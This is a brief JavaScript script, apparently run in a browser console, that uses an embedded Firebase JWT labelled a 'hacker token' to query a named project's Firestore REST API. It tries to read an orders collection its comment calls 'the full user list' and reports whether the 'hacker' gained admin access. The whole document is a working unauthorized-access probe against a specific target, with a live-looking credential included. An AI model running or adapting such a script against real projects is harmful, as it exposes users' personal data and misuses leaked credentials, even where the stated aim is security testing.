// 1. PASTE YOUR HACKER TOKEN
const HACKER_TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjNzQ5NTFmNjBhMDE0NzE3ZjFlMzA4ZDZiMjgwZjQ4ZjFlODhmZGEiLCJ0eXAiOiJKV1QifQ.eyJwcm92aWRlcl9pZCI6ImFub255bW91cyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9iYWZzZHZhcnNpdHkiLCJhdWQiOiJiYWZzZHZhcnNpdHkiLCJhdXRoX3RpbWUiOjE3NjQ5MDgyMDQsInVzZXJfaWQiOiJXOUYwd3BMSkpOVlZxV0NkYzlEV3h1WDYzc2sxIiwic3ViIjoiVzlGMHdwTEpKTlZWcVdDZGM5RFd4dVg2M3NrMSIsImlhdCI6MTc2NDkwODIwNCwiZXhwIjoxNzY0OTExODA0LCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7fSwic2lnbl9pbl9wcm92aWRlciI6ImFub255bW91cyJ9fQ.DsP7xVlUEK4IqDjv9VbR3FkGDCt9JYHIDgKwMhWW0LdArDMw7K1_cGMtGtHuIhg3qTtHg-DOT1OfF45_Crl_3FC8XymMLVYpMTsQdAV5GV884ukRyafU0kKlMDfmx4CK109KEAKDUl2hQ5kXFnSn5q_uHhh6jvJpVPBB6pvB4asY2eivKXorTLHJo3c3nP9vu3TQDt43b30sVfRXLATngvAeeaxsswuu1cJnUj8ThHG9mwSXN8lhIbKYIwPUD1fo_89wrjxIIGx-v4zCBBJiOyfYRaitwb4ibw3ln_sN7WLHtzdW9TdEOQXr6fHHdRTj8xcEUsVB3yd95IJHqnICfg"; 
const PROJECT_ID = "bafsdvarsity";

// Common paths where developers store Admin secrets
const sensitivePaths = [

  "projects/bafsdvarsity/databases/(default)/documents/bafsdvarsity/public/data/orders" // The full user list
];

console.log("🕵️‍♂️ Testing Admin Privileges...");

sensitivePaths.forEach(path => {
  const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${path}?pageSize=5`;
  
  fetch(url, {
    headers: { 'Authorization': 'Bearer ' + HACKER_TOKEN }
  })
  .then(res => res.json())
  .then(data => {
    if (data.documents) {
      console.log(`%c🚨 CRITICAL: HACKER HAS ADMIN ACCESS TO: ${path}`, "color: red; font-weight: bold;");
      console.log("I can read this data. If this is your Admin Panel data, I am now an Admin.");
    } else if (data.error && data.error.status === "PERMISSION_DENIED") {
        console.log(data.error);
      console.log(`✅ Safe: Access denied to ${path}`);
    }
  });
});